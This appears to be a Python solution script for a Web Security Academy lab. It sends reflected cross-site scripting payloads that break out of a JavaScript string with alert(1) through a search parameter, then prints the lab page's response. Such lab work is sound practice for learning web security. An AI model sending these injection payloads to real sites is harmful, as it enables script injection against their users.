import requests
from bs4 import BeautifulSoup

site = 'ac0a1fc01eff500fc07e3d0100000005.web-security-academy.net'

s = requests.Session()

payload = """foo '; alert(1);//"""
payload2 = """\'-alert(1)//"""

search_url = f'https://{site}/?search={payload2}'

resp = s.get(search_url)
soup = BeautifulSoup(resp.text,'html.parser')
print(soup)
